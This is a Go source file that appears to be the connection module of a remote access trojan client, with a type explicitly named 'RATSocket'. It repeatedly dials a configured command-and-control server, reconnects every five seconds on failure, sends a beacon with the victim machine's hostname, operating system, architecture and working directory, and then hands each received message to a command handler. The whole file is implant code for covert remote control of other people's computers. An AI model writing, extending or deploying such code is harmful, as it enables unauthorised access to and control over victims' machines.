package connection

import (
	"net"
	"os"
	"runtime"
	"time"

	"client-go/config"
	"client-go/handler"
	"client-go/protocol"
)

type Client struct{}

func New() *Client {
	return &Client{}
}

func (c *Client) Run() {
	for {
		conn, err := net.Dial("tcp", config.SERVER_ADDR)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		sock := protocol.NewRATSocket(conn)

		// send full info (fix: server list needs this)
		sock.Send(map[string]interface{}{
			"type":     "info",
			"id":       hostname(),
			"os_type":  runtime.GOOS,
			"os_ver":   runtime.GOARCH,
			"hostname": hostname(),
			"cwd":      cwd(),
			"integrity": "unknown",
			"command_manifest": []interface{}{}, // keep field
			"system_paths":     []interface{}{},
		})

		for {
			msg, err := sock.Recv()
			if err != nil {
				conn.Close()
				break
			}

			handler.Handle(sock, msg)
		}
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func cwd() string {
	d, _ := os.Getwd()
	return d
}
